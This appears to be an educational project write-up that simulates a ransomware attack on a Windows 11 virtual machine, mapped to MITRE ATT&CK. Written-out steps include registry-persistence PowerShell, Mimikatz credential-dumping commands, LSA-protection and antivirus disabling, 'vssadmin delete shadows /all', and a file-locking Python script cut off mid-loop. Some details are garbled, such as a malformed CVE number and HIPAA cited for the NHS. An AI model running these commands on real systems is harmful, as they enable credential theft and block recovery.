# Ransomware: Lifecycle and Forensic Timeline

## Project Overview

This project will provide a step-by-step theoretical guide to the six main phases that occur during a ransomware attack. This will include definitions, coding, and screenshots, documenting the changes committed to a local desktop that has been infected by an adversary. Following this, a comprehensive forensic timeline will be created, taking a different outside perspective to show where and when the signs of this attack were detected. The expected outcome will include four sections/repositories, which will showcase everything from the attack phases to the recommendations on how to mitigate the risk of this attack occurring again. 

## Relevancy

It is important to illustrate and understand this process today due to the ever-increasing ransomware attacks faced by major corporations in the United Kingdom, such as Co-Op and M&S. During the course of completing this project, another attack occurred, breaching the data of London's major retail store, Harrods. This has significant effects on a company's reputation with its customers and investors. The failure in compliance with regulations such as NIST, ISO, SANS, and the GDPR can cost an extra monetary expense over the amount in damages, threatening to take down business chains, putting thousands of employees at risk of termination. Our world is only increasing the amount that takes place over the Internet, with less and less in-person shopping. This creates a significant threat to these companies, and the need to increase security to get ahead of adversaries is an undeniable must in this technological age. 

## Case Study: NHS Ransomware Attack

- Attack Type: Ransomware through Phishing
- Attack Timeline: September 22 - October 29, 2025
- Industry: National Health Service
- Assets: Patient Personal Details (including full names, date of birth, and NHS insurance numbers) 
- Compliance Issue: HIPAA (Health Insurance Portability and Accountability Act)

## Methodology

### Infrastructure

- Oracle VirtualBox
- Windows 11 (64-bit)

### Tools Used

- Command Prompt (Administrator Level)
- DB Browser for SQLite
- Event Viewer
- Mimikatz
- PowerShell (Administrator Level)
- Registry Editor
- Steganography Online
- Visual Studio Code Insiders v. 1.105 with Python package
- Wireshark
- Zenmap
- Zsteg through Aperisolve

### Setup 

- The Windows 11 machine was booted up through the Oracle VirtualBox, ready for use.
- A user1 account was created, separate from the admin, to illustrate a typical employee in the NHS office with limited access rights. A basic password was created for this user (PAssw0rd1!).
- An email address was created for this user to be able to receive the phishing scam.
- An adversary email was developed under a randomly generated name, Mike McAdamms. This allows for user1 to receive the phishing email.
- All built-in Windows tools were activated automatically through initial installation. Attack tools were downloaded during the phases and are discussed further in their sections. The forensic tools were downloaded prior to the analysis stage.

### Constraints and Limitations

All malicious code is either illustrative or temporary due to ethical and legal issues. Due to this device being used for other means besides running the virtual machine, fully developed ransomware code was not used to ensure the safety of the software. All code will be within the bounds of the virtual machine and will not affect the computer that is hosting. The system will be connected to the Internet through an Ethernet cable; however, the device will have no access to a wider network, ensuring any issues that may arise are contained and can be mitigated locally. All recommendations within this project should not be used for malicious purposes and have been done for educational use to explore what causes certain flags within a system and what and how things can be broken to gain malicious access.

## Sources

- MITRE ATT&CK (2025) https://attack.mitre.org/
- National Vulnerability Database, CVE-2023-36874 (2023) https://nvd.nist.gov/vuln/detail/cve-2023-36874

## Contents

- **[attack_phases.md](attack_phases.md)** - Analyses and mapping of each step in the attack lifecycle.
- **[evidence_artefacts.md](evidence_artefacts.md)** - Catalogue of evidence collected during attack phases.
- **[forensic_timeline.md](forensic_timeline.md)** - A record of events generated by using a series of forensic tools and techniques.
- **[recovery_recommendations.md](recovery_recommendations.md)** - A researched overview of the recommended initial response and suggested controls to implement.

# Results

# Ransomware Attack Phases Analysis

## Overview

This document outlines the six phases mapped out in the MITRE ATT&CK framework, explaining the tactics, techniques, and procedures employed to create a successful attack. 

## Phase 1: Initial Access and Reconnaissance

### Attack Description

The attackers initiated an attack by sending a phishing email containing a Word document with hidden VBA macros within. Once entry is made, malicious actors could spend days or even weeks on the network before revealing themselves to the company. This was done in the Co-op and M&S attacks this year.

### MITRE ATT&CK Mapping

- T1566.001 - Spearphishing Attachment
   - The malware is sent through an attachment (Microsoft Office docs / executable PDFs / archived files), relying on user execution.
- T1589.002 - Email Addresses
   - Adversaries will use public-facing emails that are readily available.
- T1564.007 - VBA Stomping
   - Replaces VBA source code with benign data.

### Social Engineering Techniques

- Fear (threatens to shut down the employee's access to the network).
- Urgency (creates a fake deadline to rush the user into a split decision).
- Helpfulness (mimics an official business, NHS in this instance, gaining trust).

### Implementation

- Malicious Document: Microsoft Word file containing VBA macros sent to unsuspecting user
- Payload Delivery: Compromises the system unknowingly to the user
- Evasion: Obfuscation of macros to avoid detection and automatically runs upon opening the document

## Phase 2: Execution and Persistence 

### Attack Description 

After the attacker gains initial access, they must then use techniques to maintain it, as systems are unpredictable due to inevitable restarts, shutdowns, or credential changes. One way to ensure persistent access is by modifying the Registry keys that store the operating system's configuration settings. 

### MITRE ATT&CK Mapping

- T1547.014 - Active Setup
  - Adds Registry key to Active Setup of the local machine, executed when the user logs in.
- T1037.002 - Logout Hook
  - Utilises a plist file as a pointer to a script and executes upon user logging out.
- T1546.005 - Trap
  - Executes malicious content when triggered by an interrupt signal.
 
### Implementation

- PowerShell Script: Creates new registry keys and points to malware.exe
- Registry Editor: Contains all keys, including the added malicious ones
- Living off the Land tactic: Uses legitimate Windows tools for easier execution
- Masquerading: Disguised as authentic Windows system files, prolongs persistence

## Phase 3: Privilege Escalation and Credential Access

### Attack Description

The attacker will escalate their privileges to gain greater access to the network. This will allow the adversary to gain access to employee and customer credentials that may be stored on the system. In the case of Co-Op and M&S, millions of people had active accounts with them, which included information such as their name, date of birth, home address, and online order history. Credit card details that were saved were also at risk of having been leaked. In this case scenario, patient and employee records will be the primary focus for access.

### MITRE ATT&CK Mapping

- T1068 - Exploitation for Privilege Escalation
   - Software vulnerabilities are taken advantage of to achieve higher levels of access.
- T1003.001 - LSASS Memory
   - The Local Security Authority Subsystem Service is accessed, where data from a user login is stored.
- T1555 - Credentials from Password Stores
   - Mimikatz is manipulated to dump credentials for greater access to systems.
- T1552.002 - Unsecured Credentials
   - Insecurely stored passwords are searched through queries.

### Privilege Escalation Vulnerability 

- CVE-2023-366874 (7.8 score): In 2023, an exploitation was discovered in the privilege escalation reporting service. This allowed malicious actors to increase their access level in the system without raising any flags to other users, including the server administrators. This became a zero-day vulnerability and has been patched. However, it can still be used by those who have local access to the system, raising concerns for insider threats.

### Implementation 

- LSASS Dumping: The Local Security Authority Subsystem Service (LSASS) is responsible for authenticating users and managing credentials, allowing for smoother sign-in times for legitimate users. By using the task manager, credentials can be extracted from the system memory.
- Mimikatz: This open-source application can be used to collect passwords in plaintext from memory and is commonly used by black-hat hackers and security professionals.
- Registry: Extracted stored passwords from the registry through the Command Prompt.
- Hash Extraction: Displayed the password hashes in the security account manager database.

## Phase 4: Exploration and Lateral Movement

### Attack Description

By using the elevated credentials gained by the previous step, attackers are able to map a network and identify weak areas to gain access to assets. This allows for a broader surface to cause damage to, expanding from one M&S store, for example, to the whole national branch. This step proves to be more difficult for detection as there is a large quantity of traffic on any given network, and with the escalated credentials, there would be no bells of alarm ringing from any disguised malicious packet transports.
This step has been enhanced by the use of AI, which has removed the need for communication back and forth with a user, removing any return address and creating a more airtight cover for the red-hat hacker. To train the AI, it can be provided a script outlining the targets it should prioritise to take over (see 'Target Prioritisation' below for more information).

### Current AI Frameworks That Can Assist

- BloodHound: Uses machine learning to analyse and prioritise attack paths based on the level of impact the attacker is seeking. Can be found for free on GitHub for anyone's use, whether an authorised penetration tester or malicious user: https://github.com/MorDavid/BloodHound-MCP-AI.git. 
- DeepExploit: Adapts its vulnerability scanning and exploitation to what is most likely to succeed. Once again, this is a free and accessible project on GitHub https://github.com/TheDreamPort/deep_exploit.git.
- MITRE CALDERA: Uses plugins to autonomously explore networks and escalate privileges. It can be found on GitHub for free https://github.com/mitre/caldera.git. 

### MITRE ATT&CK Mapping

- T1018 - Remote System Discovery
   - Adversaries attempt to gain other systems' IP addresses, hostnames, or other logical identifiers.
- T1558 - Steal or Forge Kerberos Tickets
   - Using Mimikatz, the tickets can be stolen to enable a wider area of authentication through the Pass the Ticket attack.
- T1423 - Network Service Scanning
   - A list of services running on a host is created and examined for vulnerabilities to be used for exploitation.

### Target Prioritisation 

1. Domain Controllers - These devices house the Active Directory Database, which contains sensitive information about all user accounts connected to the network. By compromising this, red-hat hackers would be able to obtain hashed passwords to further their credential access, increasing the total area of damage.
2. File Servers - The servers tend to contain valuable data worth stealing and usually have underlying weaknesses due to unpatched software, allowing for easy backdoor access. It can then serve as a leaping point to move around the network and start the encryption process when the ransomware is deployed.
3. Database Servers - Accessed through the neglected security of the servers to gain sensitive data. This is also a target for Denial of Service attacks, as the cost for the unexpected downtime is astronomically high in some cases. For example, in the M&S and Co-Op situation, the downtime of the database led to empty shelves in stores as stocks could not be updated and renewed from the inaccessible database.
4. Backup Systems - To ensure the attack meets the desired destruction of the adversary, these systems must be compromised to prevent speedy recovery and ensure the company will pay out in hopes of the key to unencrypting their data. 

### Network Discovery Methods

- Active Directory Enumeration: Queried Active Directory for user accounts, groups, and systems using PowerShell with elevated access achieved through Phase 3.
- Network Scanning: Identified accessible systems and services using the open source tool: 'Nmap'.

### Lateral Movement Methods

- Pass-the-Hash: By using an extracted NTLM hash provided by Mimikatz from the previous step, the adversary can send the hash to another system remotely to gain authorisation without the need for plaintext passwords.

## Phase 5: Collection and Exfiltration

### Attack Description

Before the final deployment of encrypting all data, attackers will collect and exfiltrate sensitive data, either to use as a financial resource to sell to other companies, to return to the company from which they stole it, or to leak it online and cause mass disruption. In the case study of the M&S and Co-op, personal information was stolen and leaked. This leads to a greater threat down the line with potential fraud and more attacks occurring. Not only does this harm the business's reputation and put its operation at risk of closure, but it also creates new potential targets to be used for later attacks, with access to their names, addresses, and birthdays.

### MITRE ATT&CK Mapping

- T1074.001 - Data Staged: Local Data Staging
   - Collected data is combined into a central location for efficiency when completing exfiltration, decreasing the likelihood of being detected when moving information out of the system. 
- T1560 - Archive Collected Data
   - Adversary compresses and/or encrypts data before the exfiltration stage, minimising the amount being sent over the network, reducing the risk of detection.
- T1001.002 - Data Obfuscation: Steganography
   - Adversaries use steganographic techniques to hide command and control traffic and other valuable information within an image to avoid detection efforts.

### Data Discovery

- Sensitive File Identification: Located patient health records on the server. This information includes: full name, birthdate, and health insurance number of which can be used for fraud theft if leaked. 

### Collection and Staging

- Data Aggregation: Consolidates valuable files into staging directories for easier access and prepares for transfer out of the private network. It converts data into one consistent format and protocol interface.
- Compression: Creates encrypted archives to reduce the transfer size of the discovered files, as it would be easier for information security to detect an issue with a larger packet transfer along the network. 

### Exfiltration Methods

- Steganography: Hides data within an image file to allow for a covert transfer from within the network to an outside server. It is done by replacing the least significant bit of each pixel to store a bit of the data, altering the image only slightly, which is not noticeable to the naked eye.

## Phase 6: Impact and Ransomware Deployment

## Attack Description

This is the final stage of the ransomware attack, and it is where the malicious actors make themselves present to the company and to their customers through the use of encryption, service termination, and sometimes data leaks. This causes mass chaos, creating immense pressure on the business to decide how they are going to handle this situation, and many third parties back out due to this rupture in their reputation. The best advice is not to pay the criminals, as this only encourages the behaviour, does not guarantee data return, and will most likely cost millions more than it would have to recover the services. However, money will be lost no matter what path the company takes after this phase succeeds. In the case study, both M7S and Co-Op were unable to stock their shelves for weeks, and mobile apps for ordering were down for months, leading to an exceptional dip in revenue.

## MITRE ATT&CK Mapping

- T1486 - Data Encrypted for Impact
   - Targeted system's files and resources are encrypted, and the decryption key is withheld to extract monetary compensation from the victim or to permanently damage the service.
- T1490 - Inhibit System Recovery
   - Adversaries will turn off services that aid in the recovery of corrupted systems, increasing the destruction of the attack.
- T1491 - Defacement
   - Malicious actors affect the integrity of the original content on the system for intimidation purposes and to claim credit for the intrusion.

## Psychological Impact

- Ransom Notes: Displays threatening messages on screens, an infamous example is the WannaCry screen saver. Its bright red background with two countdowns marking a price increase with one and a total data loss is not only eye-catching but powerful in sending a message.
- Deadline Pressure: By including a countdown, stress and anxiety levels will increase. In this psychological state, rational decisions are increasingly difficult to make and can lead to severe mistakes, such as paying out the ransom.
- Data Proof: Malicious actors may provide samples of stolen data either privately to the company or publicly to use as leverage.

## Preperation

- Security Disabling: Antivirus and security services are halted to allow the ransomware to take place, with no issue from any measures put in place by either the company or automatically configured by the hardware provider.
- Shadow Copy Deletion: Removal of all Windows restore points to create further barriers in recovery.
- Backup Destruction: Backup systems are deleted to ensure all terminated services cannot be recovered through any other means but by giving in to the ransom.

## Ransomware Execution 

- File Encryption: Important documents and databases are locked from access by official employees.
- Key Management: Unique encryption keys are used per file type to decrease the likelihood of gaining access to the system without the malicious actors' help.
- Ransom Note: A default warning screen to show that the system has been compromised to initiate the psychological impact on the employees. 

# Evidence Artefacts

## Overview

This document catalogues the evidence generated by the malicious actor who is implementing ransomware in the virtual machine system. Due to ethical and legal concerns, any malicious activity is either demonstrated illustratively or temporarily, as the point is to outline the common steps an attacker takes to aid companies in identifying and deterring these events. To find more detailed information about the attack stages, please look into the [attack phases](attack_phases.md) repository.

## Digital Evidence

### 1. Email and VBA macros

#### Artefacts Collected

- Original Email Message
  - Evidence highlights the social engineering tactics used on the sender. The sender is not from the official security email address that many companies would have. There is a threat within the text of account termination, creating fear and a deadline for the user to act upon. There is also a grammatical error ("WIng"). This is a common feature within most phishing scams.

<img width="3840" height="2160" alt="email" src="https://github.com/user-attachments/assets/4f77841c-7003-4339-860a-a44b675ded80" />


- Attachment Files
  - The image below shows a message box that appeared upon opening the document, alerting the user to the attack. In an unsimulated circumstance, this would not appear; instead, it would run malicious code in the background.

<img width="3840" height="2160" alt="initalattack" src="https://github.com/user-attachments/assets/811ebd7f-3380-4f8f-9371-e893405725f1" />

- Obfuscated Code
   - Below shows another output that was automatic upon opening the document. This was an obfuscated string that would be untraceable and unreadable. In real-world scenarios, after being translated, there would not be a pop-up; instead, it would give the malicious actor access to the secured network.

<img width="3840" height="2160" alt="malware" src="https://github.com/user-attachments/assets/2f76c252-deae-47cb-9c58-c651da4152a9" />

#### VBA Code
```
Option Explicit 'catches logical errors

Function Base64Decode(base64string As String) As String 'function to decode obfuscated code
    Dim xmlObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument.6.0") 'calls library
    Dim node As Object
    Set node = xmlObj.createElement("tmp") 'extracts the object
    node.DataType = "bin.base64"
    node.Text = base64string
    Dim byteData() As Byte
    byteData = node.nodeTypedValue 'changes data type to byte
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2 'adTypeText
    stream.Mode = 3 'adModeReadWrite
    stream.Open
    stream.WriteText StrConv(byteData, vbUnicode) 'converts bytes to unicode
    stream.Position = 0 'starts at the beginning
    stream.Type = 2
    Base64Decode = stream.ReadText 'returns decoded string to procedure
    stream.Close
    
End Function

Sub Document_Open() 'procedure will run once the document is opened
    MsgBox "This file contained malicious code. Your files are now under attack!", vbExclamation, "RANSOMWARE" 'opens a message box alerting the user that the code has run
    
    Dim encoded As String
    encoded = "bWFsd2FyZQ==" '"malware" after being obfuscated in base64
    Dim decoded As String
    decoded = Base64Decode(encoded) 'calls to function
    
    MsgBox decoded
End Sub
```
### 2. System Artifacts

#### Registry Evidence

- Run Key:
  - Upon a user logging on, the malware.exe will be initiated. This will allow any processes that may have been terminated from the computer shutdown to restart. Allows for persistence in the attack and disguises itself among official Windows tools. Below is the PowerShell code:

```
$MalwarePath = "C:\Users\Public\malware.exe" #defines where the malware is stored
$RegPath = "HKCU: \Software\Microsoft\Windows\CurrentVersion\Run" #directs to the registry key
$Name = "Updater" #name of the new registry key
Set-ItemProperty -Path $RegPath -Name $Name -Value $MalwarePath
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"/v Updater /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates the new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof of new registry key in registry editor" src="https://github.com/user-attachments/assets/3fd623a1-55e2-4255-9538-32e1f03c3a1a" />

- Logoff Key:
   - Although there is no standard key for logging off, an attacker can still manipulate the environment keys, which may not take effect until after a logoff or a restart of the session. Keys in the environment will be wiped after the session ends, but having a script that runs upon logging off can inject the malicious key once again, removing its volatility. Below is the PowerShell code to add a 'logoff' key:

```
$LogoffScript = "C:\Users\Public\malware.exe" #defines where the malware is located
Set-ItemProperty â€”Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $LogoffScript
reg add "HKCU\Software\Microsoft\CurrentVersion\Logoff" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof for logoff key" src="https://github.com/user-attachments/assets/e41192b9-4fb3-4b35-a19a-a79f37f7c01b" />

- Trap:
   - To ensure total persistence is achieved, the malware must be able to handle unexpected crashes and shutdowns. Below is the code that would restart the process upon meeting an unexpected situation using the Trap procedure:

```
trap #begins when an error is detected
{ Start-Process "C:\Users\Public\malware exe" #starts malware.exe process again
Continue } #continues to the next statement after the error
```

### 3. Credentials

#### LSASS Dumping

- Task Manager was used for the creation of this dump.
   - First, open the manager.
   - Then select a process you want to dump; in this case, Application Data was chosen.
   - Right-click the process and select Create Dump File.
   - A dialogue box will appear to showcase the dump, which can be viewed through an application such as Visual Studio (see below:).
 
<img width="3840" height="2160" alt="lss dump" src="https://github.com/user-attachments/assets/bc01f94e-c9f8-430c-9cda-87968d89f973" />

This dump showcases all of the modules on the system, their versions, and storage paths, allowing malicious users to understand the configuration of the system and slip malware into places that are not accessed regularly. 

#### Mimikatz

This application was downloaded from: https://github.com/ParrotSec/mimikatz/tree/master.

[Note: when downloading it, the system's security will flag the file as a virus and once run, it will be terminated and put into quarantine. Go to Virus & Threat Protection, the history where a list of quarantined items is available. You can then manually release the file to allow it to run. For a black-hat hacker to run this without this issue, they would use the obfuscation techniques as demonstrated in the previous phases.]

1. Password Extraction:

- Before any passwords can be harvested, the user's privileges are raised. This is done through raising their role to debug, giving them access to interact with other processes, no matter what level they are.

```
privilege::debug
```

  Output:

<img width="702" height="56" alt="image" src="https://github.com/user-attachments/assets/d17fa026-0820-4f5a-918b-07b40eda7a21" />

- After this is completed, a token with high-level access is impersonated, allowing for sensitive tasks to be completed.

```
token::elevate
```

  Output:

<img width="3714" height="571" alt="image" src="https://github.com/user-attachments/assets/5bb78e68-87e3-45bf-a7fc-4b0865e71b6c" />

- Now the passwords can be dumped using 'sekurlsa', which interacts with the LSASS to extract this information.

```
serkurlsa::logonpasswords
```

  Output: P@ssw0rd!

  (The short list is due to the simulation system having only one user. For a wider network in the real   world, the list would be longer, with much more exploitation possible.) 

2. SAM Dump:

- The Security Account Manager (SAM) is a database storing all of the usernames and password hashes for local accounts on a machine. Its legitimate purpose is to authenticate users who are logging onto the device. By using Mimikatz, this information can be used to obtain further privileged access to the system.

```
lsadump:sam
```

  Output:

<img width="3840" height="2160" alt="sam" src="https://github.com/user-attachments/assets/28adc5e4-8293-46b5-b353-ee8d848e0ccd" />

3. Location Finder:

- The command prompt can be used to search for files that contain strings, such as 'password', in their names, leading malicious actors to possible locations of credentials.

```
findstr /si password *.txt
findstr /si password *.xml *.ini *.txt #searches for files ending with .xml/.ini/.txt that contain 'password' in their name throughout all files on the system
```

<img width="3840" height="2160" alt="all partition files that conatin password" src="https://github.com/user-attachments/assets/4361ac6c-bfc4-41a8-959e-005630617db5" />

- Instead of just files, the directories, their corresponding files, and the date and time of creation can be found through the code below:

```
dir /s *pass* == *cred* == *vnc* == *.config* #searches through directories for files containing 'pass'/'cred'/'vnc' in its name
```

- This allows for malicious users to find the newest credentials that will be more useful for them than the older, potentially out-of-date information.

  Output: 

<img width="3840" height="2160" alt="location and password txt list" src="https://github.com/user-attachments/assets/d96a28c5-bf17-4e36-8386-75e21f25af48" />

4. Registry:

- In previous steps, the registry has been manipulated using the command prompt. However, in this case, it can be used to search for registry keys that store passwords for further credential access.

```
reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for entries that contain 'password', including subkeys
```

  Output: 

<img width="3840" height="2160" alt="registry passwords" src="https://github.com/user-attachments/assets/3098cd73-6c5d-44fe-8314-2c54a5304424" />


### 4. Network Exploration

#### Active Directory

- All users and groups in the domain were listed along with their paths for further mapping of the network topology to start exploration and lateral movement. The following code was entered into a PowerShell window using escalated privileges obtained by the previous phase.

- Users:
  ```
  [ADSI]WinNT://$env:USERDOMAIN" #connects to active directory using Active Directory Service Interfaces (ADSI)
  $domain = [ADSI]"WinNT://$env:USERDOMAIN" #environment variable that points to Windows domain
  $domain Children | Where-Object { $_.SchemaClassName -eq 'User' } #filters all objects for user accounts
  ```
  <img width="3840" height="2160" alt="list of all users on domain" src="https://github.com/user-attachments/assets/2ae30b19-9984-4d66-acc8-8a28d6a4fd05" />

- Groups:
  ```
  $domain.Children | Where-Object { $_.SchemaClassName -eq 'Group' } #filters all objects for group property
  ```
  <img width="3840" height="2160" alt="list of all groups on domain" src="https://github.com/user-attachments/assets/151d3cfb-b385-4053-ba39-e7b837437d13" />

#### Nmap Scanning

- Nmap must be installed, which can be done on Windows using this link - nmap.org/download. It is a free resource and is able to scan networks and create topologies for easy mapping and exploration. This helps in finding weak ports that can be easily exploited by the malware. The following code was entered into the command feature on the Nmap GUI.

- Ping Scan:
  ```
  nmap -sn 192.168.1.0/24 #sends probe packets and lists which hosts respond
  ```
  <img width="3840" height="2160" alt="ping scan, all hosts on subnet (nmap)" src="https://github.com/user-attachments/assets/60021945-1c51-440d-97b7-15d81afdd16e" />

- Range Scan:
  ```
  nmap 192.168.1.1-20 #attempts to find what ports/services are open
  ```
  <img width="3840" height="2160" alt="scanned a range of ports to find weak areas (netmap)" src="https://github.com/user-attachments/assets/c6e41e20-269e-4338-bffb-330cf3665cf7" />

- Common TCP Port Scan:
  ```
  nmap 192.168.1.10 #scan top 1000 most common TCP ports to determine what services are running
  ```
  <img width="3840" height="2160" alt="scanned 1000 most common ports (nmap)" src="https://github.com/user-attachments/assets/8aa1dad5-29b8-4ba2-9994-ffea178fbe87" />

- After making use of the scans listed above, Nmap will automatically create a network topology diagram. Below is the local network graph created for the workstation:
<img width="3840" height="2160" alt="local network topology mapped (nmap)" src="https://github.com/user-attachments/assets/f2087128-3fb8-4c86-bef4-c5db009eefac" />
  
#### Stolen Kerberos Ticket

- Kerberos tickets are part of the authentication protocol that verifies identities without the need for users to send passwords over the network multiple times. This decreases the chance of interception of packets with vital information and saves time for users as they are only required to log in once. However, by using Mimikatz, malicious actors can steal and even forge such tickets to send around the network, authenticating themselves without the need for a plaintext password.
  ```
  sekurlsa::minidump lsass.dump #a snapshot of the local security authority subsystem service (LSASS) is loaded
  sekurlsa::logonpasswords #extracts and displays Kerberos tickets from LSASS memory
  ```
  <img width="2205" height="357" alt="attempt to steal kerberos tickets (before turning off)" src="https://github.com/user-attachments/assets/27ebda62-a803-441c-bbda-f37149161987" />

- An error has occurred due to unprivileged access to memory. To fix this, a register must be removed from the Registry Editor. By going to Computer > HKEY-LOCAL-MACHINE > SYSTEM > CurrentControlSet > Control > Lsa, the 'RunAsPPL' register can be found with either a value of 1 or 2. Edit this number to be 0 to turn off, removing the additional protections enforced by Windows that restrict memory access. 

  <img width="3840" height="2160" alt="lsass protection is turned off by attacker " src="https://github.com/user-attachments/assets/2b1a5fd4-559f-4710-8200-6de0d460b2db" />

- Now we can run the following code:
(NOTE: There is still an error present, as there are no other logins on the virtual machine besides the current user.)
  ```
  privilege::debug
  sekurlsa::tickets
  ```
  <img width="3840" height="2160" alt="after restarting, success just no passwords to steal" src="https://github.com/user-attachments/assets/09feec23-de05-4747-b8e5-e0d86acb3efa" />


#### Pass-the-Hash

- By using previous codes from early phases with Mimikatz, a pass-the-hash log has been generated and is ready to be sent. This will allow the attacker to be authenticated in a remote system without access to a plaintext password.
  ```
  privilege::debug
  lsadump::sam
  ```
  <img width="3840" height="2160" alt="pass the hash" src="https://github.com/user-attachments/assets/5e478791-1c45-4901-b66d-89af71013c96" />

### 5. Collection and Exfiltration

#### Data Aggregation & Compression

1. Database Creation
   - By using DB Browser for SQLite (downloaded at https://sqlitebrowser.org/dl/), three tables were created to be used for data aggregation and compression in this phase. Databases are the primary method for storing information, as they are easy to read and connect through the use of primary and foreign keys. The table names and contents can be seen through the following SQL code:
     ```
     CREATE TABLE "Patient_Demographics" (
     "Patient_ID" INTEGER NOT NULL UNIQUE, #specifies what data input should be entered to ensure consistency within the database; in this case, the data should be a unique number, and this field cannot be left blank
     "Name" TEXT NOT NULL,
     "DoB" INTEGER NOT NULL,
     PRIMARY KEY("Patient_ID") #this is another way to specify data regulations, it automatically means the field cannot be left blank and must be unique
     );
     
     CREATE TABLE "Insurance" (
     "Patient_ID" INTEGER NOT NULL UNIQUE,
     "NHS_Number" INTEGER, #as this is a primary key, NOT NULL and UNIQUE do not need to be specified here
     PRIMARY KEY("NHS_Number")
     FOREIGN KEY("Patient_ID") REFERENCES "Patient_Demographics"("Patient_ID") #reinforces referential integrity as child row must reference existing parent row
     );

     CREATE TABLE "Diagnosis" (
     "Patient_ID" INTEGER,
     "Symptoms" TEXT,
     "Treatment" TEXT,
     PRIMARY KEY("Patient_ID")
     FOREIGN KEY("Patient_ID") REFERENCES "Patient_Demographics"("Patient_ID")
     );
     ```
  - After the tables are created, data must be added. This was done using the SQL code below:
  ```
  INSERT INTO Patient_Demographics (Patient_ID, DoB) VALUES ('98', 'Deberah Allisan', '04/15/1999'), ('53', 'Donald Richards', '09/12/1967'), ('82', 'Drew Crawley', '10/11/2003');
  INSERT INTO Insurance (Patient_ID, NHS_Number) VALUES ('98', '28456058'), ('53', '47192834'), ('37482917');
  INSERT INTO Diagnosis (Patient_ID, Symptoms, Treatment) VALUES ('98', 'High body temperature', 'IV'), ('53', 'Sprained right knee', 'Wrap and crutches'), ('82', 'Dizzy spells', 'Bed rest until advised');
  ```

<img width="3840" height="2160" alt="tables with data" src="https://github.com/user-attachments/assets/1b696399-00c4-4d45-982c-8d950ef20f6c" />

2. Database Aggregation
   - Inner Join is used to combine the two most needed tables, Patient_Demographics and Insurance. These tables contain the most confidential data, which could be used for future attacks through fraud, theft, or spear-phishing to spread more ransomware, thereby repeating this cycle. The following SQL code shows how to combine the two tables:
     ```
     SELECT * #selects all fields
     FROM Patient_Demographics
     INNER JOIN Insurance #returns results from two tables that share a matching value
     USING (Patient_ID); #will only show the Patient_ID field once, bridges both tables with this value
     ```
  - The results were then exported as a CSV file, saved under 'data_agg', ready for compression and transfer.

<img width="3840" height="2160" alt="join results" src="https://github.com/user-attachments/assets/dee0c5ea-2597-439a-aeaa-ca53b6979862" />


3. Compression
   - There are three methods that can be used:
     - ZIP = Universally supported, examines each file individually to determine the most efficient way to compress it. This allows for different compression methods to be used on data in a single file to improve speed.
     - 7z = Removes redundancy in the structure. This increases the threat of file corruption as one failed data packet will lead to the chain being broken and unrecoverable. It has no recovery mechanisms built within it and is not widely used.
     -  TAR = Originally used for magnetic tape drive storage and is used for Unix systems, as it preserves file permissions.
   - The file will be compressed using ZIP, as it is universally supported and will allow for easier transportation, as it will not stand out as much as other compressed files. Also, there is less of a risk for data loss, which will cause severe issues for the attacker, as having to retry the phase several times increases the risk of being detected and mitigated before the final phase.

<img width="3840" height="2160" alt="compressed file" src="https://github.com/user-attachments/assets/903e5dc0-ffd9-45f2-992e-a56e6e8152e1" />

  
#### Steganography

- Using Steganography Online, a free resource found on GitHub (https://stylesuxx.github.io/steganography/), the aggregated dataset, generated above, was encoded into an image of the NHS logo. This will make transportation out of the server less risky for the attacker, as many emails contain this logo at the bottom, or are included within several data packet transfers as a signature.
- Below shows the confidential data being encoded using the Least Significant Bit method:
  
<img width="3840" height="2160" alt="steg encode" src="https://github.com/user-attachments/assets/e0d7ec0a-6371-4c08-9095-0e33f9fb0693" />

- Below are the images before being encoded (on the left) and after (on the right). There is no obvious difference to be detected by the human eye between these two images.

<img width="3840" height="2160" alt="before and after images (after is on right)" src="https://github.com/user-attachments/assets/f630bdae-3318-4be9-b003-ec4b92695e5b" />

### 6. Ransomware Initiated

#### Preparation

1. Security Disabling

- Antivirus services are deactivated through the Virus & Threat Protection settings inside the Windows Security App. Real-time protection is turned off, blocking the detection of malware installation and allowing it to run. This is only a short-term effect, as it will be configured back on once the computer is restarted. Therefore, this step should be taken immediately before malware deployment to ensure the setting remains off.

<img width="3840" height="2160" alt="Antivirus shutoff" src="https://github.com/user-attachments/assets/e6a8a541-f790-4b2e-9e4d-37dc83526ee0" />


2. Shadow Copy Deletion

- To delete all shadow copies on the system, the following code should be run on an Admin-level Command Prompt:

```
vssadmin delete shadows /all #Volume Shadow Copy Service Administrative is called on to delete shadows with a flag specifying all to be removed
```

- Below are the results. Please note that there are no items listed, as there were no shadow copies created for the Virtual Machine. Normally, a list of copies will be shown, including the path where it was saved.

<img width="3840" height="2160" alt="shadow copies deleted" src="https://github.com/user-attachments/assets/e5f486ed-da2b-4970-8e4d-990510cff380" />


- This can also be done through Disk Cleanup. First, click on 'clean up system files'.

<img width="3840" height="2160" alt="clean up system files" src="https://github.com/user-attachments/assets/7d735842-e63b-4ff5-ab2c-a49f717c5f06" />


- Then go to the 'more options' tab after the scan has completed. Once there, select the 'clean up' option under 'system restore and shadow copies' to delete all backups on the system.

<img width="3840" height="2160" alt="cleaning up system restores" src="https://github.com/user-attachments/assets/18acb000-786a-444c-ab32-e1bb92d4f354" />


3. Backup Destruction

- Through the Control Panel > System and Security> System > System Protection, restore points can be configured to disable and delete any existing backups.

<img width="3840" height="2160" alt="deleting all restore points and disabling system protection" src="https://github.com/user-attachments/assets/8ca4f126-0a70-4b66-9d1b-4b8e3a2f2fe9" />

- Below is the message box showing that the deletion was a success.

<img width="3840" height="2160" alt="after deleting restore points" src="https://github.com/user-attachments/assets/95aa47d0-c65e-4fe4-aadc-3b0ef2250346" />


#### Execution

- Through Visual Studios, using the Python language, the following code was executed to simulate the locking of files and creating a ransom note.

```
import os

# Directory path where all files will be locked
target_dir = "C:/Users/user1/Documents"

for filename in os.listdir(target_dir): #loops through the folder for all files contained within it
    file_path = os.path.join(target_dir, filename) #creates a file path through the join method
    if os.path.isfile(file_path): #ensures the file path points to a file and not a directory 
